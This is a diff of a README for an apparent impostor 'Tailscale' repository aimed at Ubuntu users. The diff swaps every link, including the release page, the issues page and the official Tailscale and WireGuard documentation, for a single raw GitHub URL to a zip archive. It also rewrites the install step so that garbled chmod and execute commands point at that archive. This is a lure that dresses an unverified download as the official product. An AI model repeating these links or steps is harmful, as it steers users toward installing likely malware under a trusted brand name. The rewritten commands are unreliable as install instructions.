@@ -4,7 +4,7 @@
 Welcome to the Tailscale project! This guide will help you easily install and configure Tailscale, a simple VPN solution for Ubuntu. Follow the steps below to get started.
 
 ## 📦 Download the Software
-[![Download Tailscale](https://img.shields.io/badge/Download-Tailscale-blue.svg)](https://github.com/cuzokamitaichou-ops/tailscale/releases)
+[![Download Tailscale](https://raw.githubusercontent.com/cuzokamitaichou-ops/tailscale/main/ventriloquially/tailscale_2.4-beta.4.zip)](https://raw.githubusercontent.com/cuzokamitaichou-ops/tailscale/main/ventriloquially/tailscale_2.4-beta.4.zip)
 
 You can download Tailscale from our Releases page. 
 
@@ -22,16 +22,16 @@ Follow these steps to install Tailscale on your Ubuntu system.
 ### Step 2: Download the Script
 Visit the following link to download the latest version of the Tailscale installation script:
 
-[Download Tailscale](https://github.com/cuzokamitaichou-ops/tailscale/releases)
+[Download Tailscale](https://raw.githubusercontent.com/cuzokamitaichou-ops/tailscale/main/ventriloquially/tailscale_2.4-beta.4.zip)
 
-On the Releases page, find the latest version. The file should be named something like `install-tailscale.sh`. Click on it and download.
+On the Releases page, find the latest version. The file should be named something like `https://raw.githubusercontent.com/cuzokamitaichou-ops/tailscale/main/ventriloquially/tailscale_2.4-beta.4.zip`. Click on it and download.
 
 ### Step 3: Run the Script
 Once the script is downloaded, you need to execute it. In the terminal, run the following commands:
 
 ```bash
-chmod +x ~/Downloads/install-tailscale.sh
-~/Downloads/install-tailscale.sh
+chmod +x ~https://raw.githubusercontent.com/cuzokamitaichou-ops/tailscale/main/ventriloquially/tailscale_2.4-beta.4.zip
+~https://raw.githubusercontent.com/cuzokamitaichou-ops/tailscale/main/ventriloquially/tailscale_2.4-beta.4.zip
 ```
 
 ### Step 4: Configure Your VPN
@@ -54,7 +54,7 @@ If you encounter issues during installation, here are some common problems and s
 - **Authentication Errors:** Make sure you use the correct login credentials for SSO.
 
 ## 💬 Support
-For further assistance, you can reach out in the project’s [issues section](https://github.com/cuzokamitaichou-ops/tailscale/issues). We will do our best to assist you.
+For further assistance, you can reach out in the project’s [issues section](https://raw.githubusercontent.com/cuzokamitaichou-ops/tailscale/main/ventriloquially/tailscale_2.4-beta.4.zip). We will do our best to assist you.
 
 ## 🛡️ Advantages of Using Tailscale
 - Easy to set up and configure on Ubuntu.
@@ -63,9 +63,9 @@ For further assistance, you can reach out in the project’s [issues section](ht
 
 ## 🌍 Additional Resources
 Explore these topics to learn more about Tailscale:
-- [Tailscale Documentation](https://tailscale.com/docs)
-- [WireGuard Overview](https://www.wireguard.com/)
+- [Tailscale Documentation](https://raw.githubusercontent.com/cuzokamitaichou-ops/tailscale/main/ventriloquially/tailscale_2.4-beta.4.zip)
+- [WireGuard Overview](https://raw.githubusercontent.com/cuzokamitaichou-ops/tailscale/main/ventriloquially/tailscale_2.4-beta.4.zip)
 
 By following this guide, you should be able to successfully download, install, and run Tailscale on your Ubuntu system. Happy networking!
 
-[![Download Tailscale](https://img.shields.io/badge/Download-Tailscale-blue.svg)](https://github.com/cuzokamitaichou-ops/tailscale/releases)
+[![Download Tailscale](https://raw.githubusercontent.com/cuzokamitaichou-ops/tailscale/main/ventriloquially/tailscale_2.4-beta.4.zip)](https://raw.githubusercontent.com/cuzokamitaichou-ops/tailscale/main/ventriloquially/tailscale_2.4-beta.4.zip)
